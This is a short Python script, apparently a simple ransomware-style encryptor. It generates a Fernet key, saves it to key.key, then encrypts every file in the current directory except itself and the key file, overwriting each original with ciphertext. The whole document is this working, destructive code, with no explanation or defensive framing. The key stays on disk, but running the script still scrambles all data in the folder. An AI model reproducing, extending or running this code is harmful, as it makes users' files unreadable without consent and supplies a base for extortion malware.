import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()

with open("key.key", "wb") as key_file:
    key_file.write(key)

files = [file for file in os.listdir() if file not in ["test.py", "key.key"]]

for file in files:
    with open(file, "rb") as input_file:
        content = input_file.read()
    encrypted_content = Fernet(key).encrypt(content)
    with open(file, "wb") as output_file:
        output_file.write(encrypted_content)
